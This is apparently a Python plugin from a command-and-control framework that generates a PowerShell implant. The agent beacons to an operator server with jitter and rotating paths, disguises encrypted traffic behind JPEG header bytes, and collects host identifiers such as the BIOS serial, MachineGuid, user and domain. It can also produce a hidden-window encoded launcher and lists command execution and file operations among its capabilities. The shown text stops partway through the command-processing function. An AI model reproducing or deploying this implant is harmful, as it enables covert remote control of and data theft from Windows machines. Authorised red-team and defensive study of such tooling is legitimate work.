import os
import base64
import json
import time
import datetime
from typing import Dict, Any, List, Optional, Union

from plugins.agent_plugin_interface import AgentPluginInterface


class PowerShellAgentV2(AgentPluginInterface):
    """PowerShell agent plugin with embedded templates"""
    
    @classmethod
    def get_name(cls) -> str:
        """Return the name of this agent type for UI display"""
        return "PowerShell"
    
    @classmethod
    def get_description(cls) -> str:
        """Return a description of this agent type"""
        return "A PowerShell-based agent with secure key exchange, path rotation, and file operations"
    
    @classmethod
    def get_options(cls) -> Dict[str, Dict[str, Any]]:
        """Return configuration options for PowerShell agent"""
        return {
            "beacon_period": {
                "type": "int",
                "default": 5,
                "description": "Beacon interval in seconds - how often the agent checks in",
                "required": True
            },
            "jitter_percentage": {
                "type": "int",
                "default": 20,
                "description": "Random variation in beacon timing (percentage)",
                "required": True
            },
            "random_sleep_enabled": {
                "type": "bool",
                "default": False,
                "description": "Enable random sleep between operations for OPSEC",
                "required": False
            },
            "max_sleep_time": {
                "type": "int",
                "default": 10,
                "description": "Maximum sleep time in seconds (if random sleep enabled)",
                "required": False
            },
            "max_failures": {
                "type": "int",
                "default": 3,
                "description": "Maximum connection failures before using fallback paths",
                "required": False
            },
            "max_backoff_time": {
                "type": "int",
                "default": 10,
                "description": "Maximum time between reconnection attempts in seconds",
                "required": False
            },
            "user_agent": {
                "type": "string",
                "default": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
                "description": "User-Agent string for HTTP requests",
                "required": False
            },
            "proxy_enabled": {
                "type": "bool",
                "default": False,
                "description": "Enable proxy for HTTP requests",
                "required": False
            },
            "proxy_type": {
                "type": "list",
                "default": "system",
                "description": "Type of proxy to use",
                "required": False,
                "values": ["system", "http", "socks4", "socks5"]
            },
            "proxy_server": {
                "type": "string",
                "default": "",
                "description": "Proxy server address (hostname or IP)",
                "required": False
            },
            "proxy_port": {
                "type": "string",
                "default": "",
                "description": "Proxy server port",
                "required": False
            },
            "username": {
                "type": "string",
                "default": "",
                "description": "Username for proxy or HTTP authentication (optional)",
                "required": False
            },
            "password": {
                "type": "string",
                "default": "",
                "description": "Password for proxy or HTTP authentication (optional)",
                "required": False
            },
            "format": {
                "type": "list",
                "default": "ps1",
                "description": "Output format for the agent",
                "required": False,
                "values": ["ps1", "base64", "encoded_command"]
            }
        }
    
    @classmethod
    def get_agent_capabilities(cls) -> List[str]:
        """Return capabilities supported by PowerShell agent"""
        return [
            "file_operations", 
            "dynamic_path_rotation", 
            "secure_key_exchange",
            "system_information",
            "command_execution"
        ]
    
    @classmethod
    def get_supported_platforms(cls) -> List[str]:
        """Return platforms supported by PowerShell agent"""
        return ["windows"]
    
    @classmethod
    def _generate_agent_code(cls, config: Dict[str, Any], campaign_settings: Dict[str, Any]) -> str:
        """
        Generate PowerShell agent code based on configuration
        
        Args:
            config: Plugin-specific configuration
            campaign_settings: Campaign-wide settings
            
        Returns:
            Generated PowerShell agent code
        """
        # Extract required campaign settings
        server_address = campaign_settings.get("server_address", "")
        rotation_info = campaign_settings.get("rotation_info", None)
        
        # Extract configuration values
        beacon_interval = config.get("beacon_period", 5)
        jitter_percentage = config.get("jitter_percentage", 20)
        random_sleep_enabled = config.get("random_sleep_enabled", False)
        max_sleep_time = config.get("max_sleep_time", 10)
        max_failures = config.get("max_failures", 3)
        max_backoff_time = config.get("max_backoff_time", 10)
        user_agent = config.get("user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36")
        proxy_enabled = config.get("proxy_enabled", False)
        proxy_type = config.get("proxy_type", "system")
        proxy_server = config.get("proxy_server", "")
        proxy_port = config.get("proxy_port", "")
        username = config.get("username", "")
        password = config.get("password", "")
        
        # Configure path rotation
        if rotation_info is None:
            rotation_id = "0"
            next_rotation = str(int(time.time()) + 3600)
            rotation_interval = "3600"
            path_pool_code = "$global:pathPool = @()"
        else:
            rotation_id = str(rotation_info.get('current_rotation_id', 0))
            next_rotation = str(rotation_info.get('next_rotation_time', 0))
            rotation_interval = str(rotation_info.get('rotation_interval', 3600))
            
            # Extract path pool from rotation info
            path_pool = rotation_info.get('current_paths', {}).get('path_pool', [])
            if path_pool:
                path_pool_str = "'" + "', '".join(path_pool) + "'"
                path_pool_code = f"$global:pathPool = @({path_pool_str})"
            else:
                path_pool_code = "$global:pathPool = @()"
        
        # Generate path rotation code
        path_rotation_code = cls._get_path_rotation_template()
        path_rotation_code = path_rotation_code.replace("{{ROTATION_ID}}", str(rotation_id))
        path_rotation_code = path_rotation_code.replace("{{NEXT_ROTATION_TIME}}", str(next_rotation))
        path_rotation_code = path_rotation_code.replace("{{ROTATION_INTERVAL}}", str(rotation_interval))
        
        # No need to replace these placeholder paths in pool-only mode, they're not used
        path_rotation_code = path_rotation_code.replace("{{BEACON_PATH}}", "")
        path_rotation_code = path_rotation_code.replace("{{CMD_RESULT_PATH}}", "")
        path_rotation_code = path_rotation_code.replace("{{FILE_UPLOAD_PATH}}", "")
        path_rotation_code = path_rotation_code.replace("{{FILE_REQUEST_PATH}}", "")
        
        # Update path pool with the provided path pool code
        path_rotation_code = path_rotation_code.replace("$global:pathPool = @()", path_pool_code)
        
        # Convert boolean values to PowerShell format
        random_sleep_enabled_ps = "$true" if random_sleep_enabled else "$false"
        proxy_enabled_ps = "$true" if proxy_enabled else "$false"
        
        # Get file operations code
        file_operations_code = cls._get_file_operations_template()
        
        # Fill in the agent template with all values
        agent_code = cls._get_agent_template()
        agent_code = agent_code.replace("{{SERVER_ADDRESS}}", server_address)
        agent_code = agent_code.replace("{{BEACON_PATH}}", "")  # Not needed in pool-only mode
        agent_code = agent_code.replace("{{CMD_RESULT_PATH}}", "")  # Not needed in pool-only mode
        agent_code = agent_code.replace("{{PATH_ROTATION_CODE}}", path_rotation_code)
        agent_code = agent_code.replace("{{FILE_OPERATIONS_CODE}}", file_operations_code)
        agent_code = agent_code.replace("{{BEACON_INTERVAL}}", str(beacon_interval))
        agent_code = agent_code.replace("{{JITTER_PERCENTAGE}}", str(jitter_percentage))
        agent_code = agent_code.replace("{{MAX_FAILURES}}", str(max_failures))
        agent_code = agent_code.replace("{{MAX_BACKOFF}}", str(max_backoff_time))
        agent_code = agent_code.replace("{{RANDOM_SLEEP_ENABLED}}", random_sleep_enabled_ps)
        agent_code = agent_code.replace("{{MAX_SLEEP_TIME}}", str(max_sleep_time))
        agent_code = agent_code.replace("{{USER_AGENT}}", user_agent)
        agent_code = agent_code.replace("{{USERNAME}}", username)
        agent_code = agent_code.replace("{{PASSWORD}}", password)
        agent_code = agent_code.replace("{{PROXY_ENABLED}}", proxy_enabled_ps)
        agent_code = agent_code.replace("{{PROXY_TYPE}}", proxy_type)
        agent_code = agent_code.replace("{{PROXY_SERVER}}", proxy_server)
        agent_code = agent_code.replace("{{PROXY_PORT}}", proxy_port)
        
        # Add version and timestamp metadata as comments
        version_info = f"""
# Kinetic Compliance Matrix Agent v2.0.0
# Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
# Platform: Windows
# Type: PowerShell
"""
        agent_code = version_info + agent_code
        
        return agent_code
    
    @classmethod
    def _generate_base64(cls, agent_code: str) -> str:
        """
        Convert PowerShell code to Base64-encoded command
        
        Args:
            agent_code: PowerShell agent code
            
        Returns:
            Base64-encoded PowerShell command
        """
        encoded = base64.b64encode(agent_code.encode("UTF-8")).decode("UTF-8")
        powershell_command = f"powershell -w hidden -e {encoded}"
        return powershell_command
    
    @classmethod
    def generate(cls, config: Dict[str, Any], campaign_settings: Dict[str, Any]) -> Dict[str, Any]:
        """
        Generate the PowerShell agent using the provided configuration
        
        Args:
            config: Dictionary containing plugin-specific configuration
            campaign_settings: Dictionary containing campaign-wide settings
            
        Returns:
            Dictionary containing:
                "code": Generated agent code
                "files": List of file paths generated (if any)
                "instructions": User instructions
                "summary": Short summary of what was generated
        """
        # Validate configuration
        errors = cls.validate_config(config)
        if errors:
            error_msg = "\n".join([f"{key}: {', '.join(msgs)}" for key, msgs in errors.items()])
            raise ValueError(f"Configuration validation failed:\n{error_msg}")
        
        # Generate the PowerShell agent code
        agent_code = cls._generate_agent_code(config, campaign_settings)
        
        # Determine output format
        output_format = config.get("format", "ps1")
        
        # Create base64 or encoded command if requested
        if output_format == "base64" or output_format == "encoded_command":
            encoded_command = cls._generate_base64(agent_code)
        
        # Save to file if campaign folder is provided
        files = []
        if "campaign_folder" in campaign_settings:
            campaign_folder = campaign_settings["campaign_folder"]
            agents_folder = os.path.join(campaign_folder, "agents")
            os.makedirs(agents_folder, exist_ok=True)
            
            # Save raw PowerShell file
            ps1_path = os.path.join(agents_folder, "powershell_agent.ps1")
            with open(ps1_path, 'w') as f:
                f.write(agent_code)
            files.append(ps1_path)
            
            # Save encoded command if generated
            if output_format == "base64" or output_format == "encoded_command":
                encoded_path = os.path.join(agents_folder, "powershell_encoded.txt")
                with open(encoded_path, 'w') as f:
                    f.write(encoded_command)
                files.append(encoded_path)
        
        # Prepare result
        result = {
            "code": encoded_command if output_format == "base64" or output_format == "encoded_command" else agent_code,
            "files": files,
            "instructions": (
                "Run the PowerShell command in a terminal to execute the agent. "
                "The agent will establish a connection to your C2 server "
                f"at {campaign_settings.get('server_address', 'UNKNOWN')}."
            ),
            "summary": (
                f"PowerShell {'Base64 encoded ' if output_format != 'ps1' else ''}agent generated with "
                f"{config.get('beacon_period', 5)}s beacon interval "
                f"and {config.get('jitter_percentage', 20)}% jitter."
            )
        }
        
        return result

    @classmethod
    def _get_agent_template(cls) -> str:
        """
        Return the embedded agent template
        
        Returns:
            PowerShell agent template code
        """
        return """# Kinetic Compliance Matrix - OPSEC-Enhanced PowerShell Agent with Secure Key Exchange

# Set TLS 1.2 for compatibility
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Server details
$global:serverAddress = '{{SERVER_ADDRESS}}'

# Agent configuration
$beaconInterval = {{BEACON_INTERVAL}}  # Seconds
$jitterPercentage = {{JITTER_PERCENTAGE}}  # +/- percentage
$maxFailuresBeforeFallback = {{MAX_FAILURES}}
$maxBackoffTime = {{MAX_BACKOFF}}
$randomSleepEnabled = {{RANDOM_SLEEP_ENABLED}}  # Optional random sleep between operations
$maxSleepTime = {{MAX_SLEEP_TIME}}  # Maximum sleep time in seconds
$userAgent = "{{USER_AGENT}}"

# Authentication credentials (if configured)
$username = "{{USERNAME}}"
$password = "{{PASSWORD}}"
$useCredentials = ($username -ne "") -and ($password -ne "")

# Proxy configuration
$proxyEnabled = {{PROXY_ENABLED}}
$proxyType = "{{PROXY_TYPE}}"
$proxyServer = "{{PROXY_SERVER}}"
$proxyPort = "{{PROXY_PORT}}"

# Initialize encryption key as null - will be obtained from server
$global:encryptionKey = $null
$global:firstContact = $true  # Flag to track if this is the first contact
$global:systemInfoSent = $false  # Flag to track if system info has been sent
$global:clientID = $null  # Store client ID received from server (only used for first contact)
$global:serverPublicKey = $null  # Store server's RSA public key
$global:keyRegistrationStatus = "pending"  # Track key registration status: pending, success, or failed

{{PATH_ROTATION_CODE}}

# Function to set up proxy configuration
function Initialize-ProxySettings {
    if (-not $proxyEnabled) {
        return $null
    }
    
    $proxy = $null
    
    try {
        # Use system proxy settings
        if ($proxyType -eq "system") {
            # Get default system proxy
            $proxy = [System.Net.WebRequest]::GetSystemWebProxy()
            
            # Check if we have a system proxy configured
            if ($proxy) {
                Write-Host "Using system proxy configuration"
                return $proxy
            } else {
                Write-Host "No system proxy configured, continuing without proxy"
                return $null
            }
        }
        
        # Use manual proxy settings
        if ($proxyServer -and $proxyPort) {
            $proxyUri = "http://$proxyServer`:$proxyPort"
            
            if ($proxyType -eq "http") {
                $proxy = New-Object System.Net.WebProxy($proxyUri, $true)
                Write-Host "Using HTTP proxy: $proxyUri"
            }
            elseif ($proxyType -eq "socks4" -or $proxyType -eq "socks5") {
                # Direct SOCKS support is limited in .NET
                # This sets the proxy as HTTP, but with SOCKS endpoint
                # A more complete implementation would use a SOCKS library
                $proxy = New-Object System.Net.WebProxy($proxyUri, $true)
                Write-Host "Using $proxyType proxy: $proxyUri (via HTTP proxy)"
            }
            
            # Add proxy credentials if configured
            if ($useCredentials) {
                $credentials = New-Object System.Net.NetworkCredential($username, $password)
                $proxy.Credentials = $credentials
                Write-Host "Proxy credentials configured"
            }
            
            return $proxy
        }
    }
    catch {
        Write-Host "Error configuring proxy: $_"
    }
    
    # Default return if no proxy configured
    return $null
}

# Initialize proxy settings
$global:proxyInstance = Initialize-ProxySettings

# Function to create a WebClient with proper settings
function New-WebClient {
    $webClient = New-Object System.Net.WebClient
    
    # Set User-Agent
    $webClient.Headers.Add("User-Agent", $userAgent)
    
    # Set proxy if enabled
    if ($proxyEnabled -and $global:proxyInstance) {
        $webClient.Proxy = $global:proxyInstance
    }
    
    # Add authentication credentials if configured
    if ($useCredentials) {
        $credentials = New-Object System.Net.NetworkCredential($username, $password)
        $webClient.Credentials = $credentials
    }
    
    return $webClient
}

#
# RSA Key Exchange Functions
#

# Function to generate a secure AES-256 key
function New-AESKey {
    <#
    .SYNOPSIS
        Generates a secure random AES-256 key
    .DESCRIPTION
        Uses cryptographically secure random number generator to create AES key
    .OUTPUTS
        System.Byte[] - 32-byte AES key
    #>
    
    try {
        # Create a cryptographically secure RNG
        $rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
        
        # Create buffer for 256-bit (32-byte) key
        $key = New-Object byte[] 32
        
        # Fill with random bytes
        $rng.GetBytes($key)
        
        # Dispose of the RNG
        $rng.Dispose()
        
        return $key
    }
    catch {
        Write-Host "Error generating AES key: $_"
        return $null
    }
}

# Function to import RSA public key from PEM format
function Import-RSAPublicKey {
    <#
    .SYNOPSIS
        Imports an RSA public key from PEM/base64 format
    .DESCRIPTION
        Parses and imports an RSA public key from PEM format or base64 string
    .PARAMETER KeyData
        PEM formatted key or base64 encoded key data
    .OUTPUTS
        RSA public key object
    #>
    param(
        [Parameter(Mandatory=$true)]
        [string]$KeyData
    )
    
    try {
        # Check if the key is in PEM format and extract the base64 part if needed
        if ($KeyData -match "-----BEGIN PUBLIC KEY-----") {
            # Extract the base64 part from PEM format
            $lines = $KeyData -split "`n"
            $base64Key = ""
            $capture = $false
            
            foreach ($line in $lines) {
                if ($line -match "-----END PUBLIC KEY-----") {
                    $capture = $false
                }
                
                if ($capture) {
                    $base64Key += $line.Trim()
                }
                
                if ($line -match "-----BEGIN PUBLIC KEY-----") {
                    $capture = $true
                }
            }
            
            # Use the extracted base64 data
            $KeyData = $base64Key
        }
        
        # Decode base64 data
        $keyBytes = [System.Convert]::FromBase64String($KeyData)
        
        # Create RSA provider
        $rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider
        
        # Import key
        $rsa.ImportSubjectPublicKeyInfo($keyBytes, [ref]$null)
        
        return $rsa
    }
    catch {
        Write-Host "Error importing RSA public key: $_"
        return $null
    }
}

# Function to encrypt AES key with RSA public key
function Protect-AESKeyWithRSA {
    <#
    .SYNOPSIS
        Encrypts an AES key using an RSA public key
    .DESCRIPTION
        Uses RSA-OAEP with SHA-256 to encrypt an AES key for secure transmission
    .PARAMETER AESKey
        The AES key to encrypt (byte array)
    .PARAMETER RSAKey
        The RSA public key object to use for encryption
    .OUTPUTS
        Base64 encoded encrypted AES key
    #>
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$AESKey,
        
        [Parameter(Mandatory=$true)]
        [System.Security.Cryptography.RSACryptoServiceProvider]$RSAKey
    )
    
    try {
        # Encrypt using OAEP padding (more secure than PKCS#1)
        $encryptedKey = $RSAKey.Encrypt($AESKey, $true)
        
        # Convert to base64 for transmission
        return [System.Convert]::ToBase64String($encryptedKey)
    }
    catch {
        Write-Host "Error encrypting AES key: $_"
        return $null
    }
}

# Function to register AES key with server
function Register-ClientKey {
    <#
    .SYNOPSIS
        Registers a client-generated AES key with the server
    .DESCRIPTION
        Sends the encrypted AES key to the server's key registration endpoint
    .PARAMETER EncryptedKey
        Base64 encoded RSA-encrypted AES key
    .PARAMETER ClientId
        The client's unique identifier
    .OUTPUTS
        Boolean indicating success or failure
    #>
    param(
        [Parameter(Mandatory=$true)]
        [string]$EncryptedKey,
        
        [Parameter(Mandatory=$true)]
        [string]$ClientId
    )
    
    try {
        # Create registration request
        $registration = @{
            encrypted_key = $EncryptedKey
            client_id = $ClientId
            nonce = [System.Guid]::NewGuid().ToString()  # Include nonce for replay protection
        }
        
        # Convert to JSON
        $registrationJson = ConvertTo-Json -InputObject $registration -Compress
        
        # Create web client for key registration
        $webClient = New-WebClient
        
        # Send registration to dedicated path
        $registrationUrl = "http://$serverAddress/client/service/registration"
        
        Write-Host "Sending key registration to $registrationUrl"
        
        # Ensure content type is set
        $webClient.Headers.Add("Content-Type", "application/json")
        
        # Send the registration request
        $response = $webClient.UploadString($registrationUrl, $registrationJson)
        
        # Parse response
        try {
            $responseObj = ConvertFrom-Json -InputObject $response
            
            # Check if registration was successful
            if ($responseObj.status -eq "success") {
                Write-Host "Key registration successful"
                return $true
            }
            else {
                Write-Host "Key registration failed: $($responseObj.message)"
                return $false
            }
        }
        catch {
            Write-Host "Error parsing registration response: $_"
            return $false
        }
    }
    catch {
        Write-Host "Error registering client key: $_"
        return $false
    }
}

# Function to handle server-provided RSA public key
function Process-ServerPublicKey {
    <#
    .SYNOPSIS
        Processes the server's public key received during first contact
    .DESCRIPTION
        Imports the server's public key and initiates client key registration
    .PARAMETER PublicKeyBase64
        Base64 encoded public key from server
    .OUTPUTS
        Boolean indicating success of key setup process
    #>
    param(
        [Parameter(Mandatory=$true)]
        [string]$PublicKeyBase64
    )
    
    try {
        # Import server's public key
        $global:serverPublicKey = Import-RSAPublicKey -KeyData $PublicKeyBase64
        
        if (-not $global:serverPublicKey) {
            Write-Host "Failed to import server public key"
            return $false
        }
        
        Write-Host "Successfully imported server public key"
        
        # Generate a secure client AES key
        $clientKey = New-AESKey
        
        if (-not $clientKey) {
            Write-Host "Failed to generate client AES key"
            return $false
        }
        
        Write-Host "Generated client AES key"
        
        # Encrypt the client key with server's public key
        $encryptedKey = Protect-AESKeyWithRSA -AESKey $clientKey -RSAKey $global:serverPublicKey
        
        if (-not $encryptedKey) {
            Write-Host "Failed to encrypt client key"
            return $false
        }
        
        Write-Host "Encrypted client key with server's public key"
        
        # Register the key with the server
        $registrationResult = Register-ClientKey -EncryptedKey $encryptedKey -ClientId $global:clientID
        
        if ($registrationResult) {
            # Set the global encryption key to our generated key
            $global:encryptionKey = $clientKey
            $global:keyRegistrationStatus = "success"
            Write-Host "Successfully registered client key with server"
            return $true
        }
        else {
            $global:keyRegistrationStatus = "failed"
            Write-Host "Failed to register client key with server"
            return $false
        }
    }
    catch {
        Write-Host "Error processing server public key: $_"
        $global:keyRegistrationStatus = "failed"
        return $false
    }
}

# Function to encrypt data for C2 communication with binary JPEG header
function Encrypt-Data {
    param([string]$PlainText)
    
    # Check if we have an encryption key yet
    if ($null -eq $global:encryptionKey) {
        # Return plaintext if no encryption key available yet
        return $PlainText
    }
    
    # Convert to bytes
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($PlainText)
    
    # Generate random IV
    $iv = New-Object byte[] 16
    $rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
    $rng.GetBytes($iv)
    
    # Add padding
    $blockSize = 16
    $paddingLength = $blockSize - ($bytes.Length % $blockSize)
    $paddedBytes = New-Object byte[] ($bytes.Length + $paddingLength)
    [Array]::Copy($bytes, $paddedBytes, $bytes.Length)
    
    # Fill padding bytes
    for ($i = $bytes.Length; $i -lt $paddedBytes.Length; $i++) {
        $paddedBytes[$i] = [byte]$paddingLength
    }
    
    # Encrypt
    $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::None
    $aes.Key = $global:encryptionKey
    $aes.IV = $iv
    
    $encryptor = $aes.CreateEncryptor()
    $encryptedBytes = $encryptor.TransformFinalBlock($paddedBytes, 0, $paddedBytes.Length)
    
    # Combine IV and encrypted bytes
    $result = New-Object byte[] ($iv.Length + $encryptedBytes.Length)
    [Array]::Copy($iv, 0, $result, 0, $iv.Length)
    [Array]::Copy($encryptedBytes, 0, $result, $iv.Length, $encryptedBytes.Length)
    
    # Add JPEG header bytes (0xFF, 0xD8, 0xFF) at binary level before base64 encoding
    $jpegHeader = [byte[]]@(0xFF, 0xD8, 0xFF)
    $withHeader = New-Object byte[] ($jpegHeader.Length + $result.Length)
    [Array]::Copy($jpegHeader, 0, $withHeader, 0, $jpegHeader.Length)
    [Array]::Copy($result, 0, $withHeader, $jpegHeader.Length, $result.Length)
    
    # Return Base64
    return [System.Convert]::ToBase64String($withHeader)
}

# Function to decrypt data from C2 communication
function Decrypt-Data {
    param([string]$EncryptedBase64)
    
    # Check if we have an encryption key yet
    if ($null -eq $global:encryptionKey) {
        # Return the data as-is if no encryption key available yet
        return $EncryptedBase64
    }
    
    try {
        # Decode base64
        $encryptedBytes = [System.Convert]::FromBase64String($EncryptedBase64)
        
        # Check if there's a JPEG header and remove it
        if (($encryptedBytes.Length > 3) -and 
            ($encryptedBytes[0] -eq 0xFF) -and 
            ($encryptedBytes[1] -eq 0xD8) -and 
            ($encryptedBytes[2] -eq 0xFF)) {
            # Allocate a new array without the JPEG header
            $withoutHeader = New-Object byte[] ($encryptedBytes.Length - 3)
            [Array]::Copy($encryptedBytes, 3, $withoutHeader, 0, $encryptedBytes.Length - 3)
            $encryptedBytes = $withoutHeader
        }
        
        # Extract IV and ciphertext
        $iv = $encryptedBytes[0..15]
        $ciphertext = $encryptedBytes[16..($encryptedBytes.Length-1)]
        
        # Create AES decryptor
        $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::None
        $aes.Key = $global:encryptionKey
        $aes.IV = $iv
        
        # Decrypt
        $decryptor = $aes.CreateDecryptor()
        $decryptedBytes = $decryptor.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
        
        # Remove padding
        $paddingLength = $decryptedBytes[$decryptedBytes.Length-1]
        $unpaddedBytes = $decryptedBytes[0..($decryptedBytes.Length-$paddingLength-1)]
        
        # Convert to string
        return [System.Text.Encoding]::UTF8.GetString($unpaddedBytes)
    }
    catch {
        # If decryption fails, it could be an initial exchange or invalid data
        # Just return the original input
        return $EncryptedBase64
    }
}

# Function to handle key issuance or rotation
function Update-EncryptionKey {
    param([string]$Base64Key)
    
    try {
        # Convert the Base64 key to a byte array
        $newKey = [System.Convert]::FromBase64String($Base64Key)
        
        # If we're receiving a server key but we already have a client key, ignore this
        # unless our client key registration failed or is pending
        if ($global:keyRegistrationStatus -eq "success" -and $global:encryptionKey -ne $null) {
            Write-Host "Ignoring server key as we're already using a client-generated key"
            return $true
        }
        
        # Set the global encryption key
        $global:encryptionKey = $newKey
        
        # After receiving a key, we're no longer in first contact
        $global:firstContact = $false
        
        Write-Host "Encryption key updated successfully"
        return $true
    }
    catch {
        Write-Host "Error updating encryption key: $_"
        return $false
    }
}

# Function to gather system identification information
function Get-SystemIdentification {
    # Gather standard system information
    $systemInfo = @{
        Hostname = [System.Net.Dns]::GetHostName()
        IP = try {
            (Get-NetIPAddress -AddressFamily IPv4 | 
             Where-Object { $_.IPAddress -ne "127.0.0.1" } | 
             Select-Object -First 1).IPAddress
        } catch {
            "Unknown"
        }
    }
    
    # Add hardware identifiers to help server correlate clients
    $systemInfo.MacAddress = try {
        (Get-CimInstance Win32_NetworkAdapterConfiguration | 
         Where-Object { $_.IPEnabled -eq $true } | 
         Select-Object -First 1).MACAddress
    } catch {
        "Unknown"
    }
    
    # Add proxy information for diagnostics
    $systemInfo.ProxyEnabled = $proxyEnabled
    $systemInfo.ProxyType = $proxyType
    
    # Add OS info for better identification
    $systemInfo.OsVersion = [System.Environment]::OSVersion.VersionString
    $systemInfo.Username = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    
    # Add rotation information if enabled
    if ($global:pathRotationEnabled) {
        $systemInfo.RotationId = $global:currentRotationId
    }
    
    # Add key registration status for diagnostics
    $systemInfo.KeyRegistrationStatus = $global:keyRegistrationStatus
    
    # Try to get more detailed machine information
    try {
        # Add machine GUID if available (good for correlation)
        $machineGuid = Get-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Cryptography" -Name "MachineGuid" -ErrorAction SilentlyContinue
        if ($machineGuid) {
            $systemInfo.MachineGuid = $machineGuid.MachineGuid
        }
        
        # Add BIOS serial
        $bios = Get-CimInstance -Class Win32_BIOS -ErrorAction SilentlyContinue
        if ($bios) {
            $systemInfo.BiosSerial = $bios.SerialNumber
        }
        
        # Add processor ID
        $cpu = Get-CimInstance -Class Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1
        if ($cpu) {
            $systemInfo.ProcessorId = $cpu.ProcessorId
        }
        
        # Add domain information
        $computerSystem = Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue
        if ($computerSystem) {
            $systemInfo.Domain = $computerSystem.Domain
            $systemInfo.PartOfDomain = $computerSystem.PartOfDomain
        }
    }
    catch {
        # If detailed info collection fails, continue with basic info
        Write-Host "Warning: Could not collect some system details: $_"
    }
    
    # Return as hashtable directly
    return $systemInfo
}

# Function to generate random padding data for token field
function Get-RandomToken {
    # Generate a totally random length between 50 and 500
    # Using Get-Random without the -SetSeed parameter for true randomness
    $rand = Get-Random -Minimum 50 -Maximum 500
    
    # Generate random alphanumeric string
    $chars = (65..90) + (97..122) + (48..57)  # A-Z, a-z, 0-9
    $padding = -join ((65..90)*2 + (97..122)*2 + (48..57)*1 | Get-Random -Count $rand | ForEach-Object {[char]$_})
    
    return $padding
}

# Function to perform a beacon operation with modular path selection
function Send-Beacon {
    param(
        $SystemInfo,  # Changed from [System.Collections.Hashtable] to allow any type
        [bool]$UseRandomPath = $true
    )
    
    # Convert SystemInfo to JSON if it's a hashtable
    $systemInfoJson = $null
    if ($SystemInfo -is [hashtable]) {
        $systemInfoJson = ConvertTo-Json -InputObject $SystemInfo -Compress
    } else {
        # Assume it's already a JSON string
        $systemInfoJson = $SystemInfo
    }
    
    # Select a random path from the pool
    $beaconPath = Get-RandomPath
    
    # Create the operation payload with operation type
    $operationPayload = @{
        "op_type" = "beacon"
        "payload" = $systemInfoJson
    }
    
    # Convert to JSON
    $operationJson = ConvertTo-Json -InputObject $operationPayload -Compress
    
    # Encrypt the data
    $encryptedData = Encrypt-Data -PlainText $operationJson
    
    # Create the request payload
    $requestPayload = @{
        "d" = $encryptedData  # Shortened from 'data'
        "t" = Get-RandomToken # Shortened from 'token'
    }
    
    # Add client ID only during first contact
    if ($global:firstContact) {
        $requestPayload.c = $global:clientID
    }
    
    # Convert to JSON
    $requestJson = ConvertTo-Json -InputObject $requestPayload -Compress
    
    # Create web client
    $webClient = New-WebClient
    
    # Randomly decide between GET and POST
    $useGetMethod = ((Get-Random -Minimum 1 -Maximum 100) -le 50)
    
    # Send request
    $response = ""
    $beaconUrl = "http://$serverAddress$beaconPath"
    
    try {
        if ($useGetMethod) {
            # For GET, parameters need to be in query string
            $queryString = "?d=$([System.Uri]::EscapeDataString($requestPayload.d))&t=$([System.Uri]::EscapeDataString($requestPayload.t))"
            if ($global:firstContact) {
                $queryString += "&i=true" # Shortened from 'init'
                if ($global:clientID) {
                    $queryString += "&c=$([System.Uri]::EscapeDataString($global:clientID))" # Shortened from 'client_id'
                }
            }
            
            Write-Host "Sending GET beacon to $beaconUrl$queryString"
            $response = $webClient.DownloadString("$beaconUrl$queryString")
        }
        else {
            # For POST, use the JSON payload
            Write-Host "Sending POST beacon to $beaconUrl"
            $response = $webClient.UploadString($beaconUrl, $requestJson)
        }
        
        return $response
    }
    catch {
        Write-Host "Error sending beacon: $_"
        throw
    }
}

# Function to send command results using random path selection
function Send-CommandResult {
    param(
        [string]$Timestamp,
        [string]$Result
    )
    
    # Select a random path from the pool
    $resultPath = Get-RandomPath
    
    # Create result object
    $resultObj = @{
        "timestamp" = $Timestamp
        "result" = $Result
    }
    
    # Create the operation payload with operation type
    $operationPayload = @{
        "op_type" = "result"
        "payload" = $resultObj
    }
    
    # Convert to JSON
    $operationJson = ConvertTo-Json -InputObject $operationPayload -Compress
    
    # Encrypt the data
    $encryptedData = Encrypt-Data -PlainText $operationJson
    
    # Create the request payload
    $requestPayload = @{
        "d" = $encryptedData  # Shortened from 'data'
        "t" = Get-RandomToken # Shortened from 'token'
    }
    
    # Convert to JSON
    $requestJson = ConvertTo-Json -InputObject $requestPayload -Compress
    
    # Create web client
    $webClient = New-WebClient
    
    # Send result via POST (more reliable for potentially large results)
    $resultUrl = "http://$serverAddress$resultPath"
    
    Write-Host "Sending command result to $resultUrl"
    try {
        $response = $webClient.UploadString($resultUrl, $requestJson)
        Write-Host "Command result sent successfully"
        return $true
    }
    catch {
        Write-Host "Error sending command result: $_"
        return $false
    }
}

{{FILE_OPERATIONS_CODE}}

# Function to process commands from the C2 server
function Process-Commands {
    param([array]$Commands)
    
    if (-not $Commands -or $Commands.Count -eq 0) {
        return
    }
    
    # Initialize tracking for processed command IDs if not exists
    if (-not (Get-Variable -Name processedCommandIds -Scope Global -ErrorAction SilentlyContinue)) {
        $global:processedCommandIds = @{}
    }
    
    # Process each command
    foreach ($command in $Commands) {
        $timestamp = $command.timestamp
        $commandType = $command.command_type
        $args = $command.args
        
        # Generate a unique command identifier
        $commandId = "$timestamp-$commandType"
        
        # Check if we've already processed this exact command
        if ($global:processedCommandIds.ContainsKey($commandId)) {
